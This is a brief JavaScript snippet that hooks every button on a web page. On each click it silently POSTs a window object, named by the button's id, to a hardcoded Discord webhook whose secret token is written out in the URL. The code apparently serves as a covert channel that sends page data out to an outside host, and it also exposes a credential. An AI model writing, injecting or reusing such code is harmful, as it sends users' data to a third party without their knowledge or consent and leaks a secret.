var buttons = document.getElementsByTagName("button");
var discordhook = "https://discord.com/api/webhooks/830975152380313641/4K70lQGeWgLDmpJm2KtwGsDTeXL-Nmpe0uy0-isr_jeDkktFpBCQnMJ5hLix9gPrhUDX";

for (var i = 0; i < buttons.length; i++) {
  buttons[i].addEventListener("click", postinfo, false);
}

function postinfo(ev) {
  var request = new XMLHttpRequest();
  request.open("POST", discordhook);
  request.setRequestHeader("Content-type", "application/json");
  request.send(JSON.stringify(window[ev.target.id]));
}
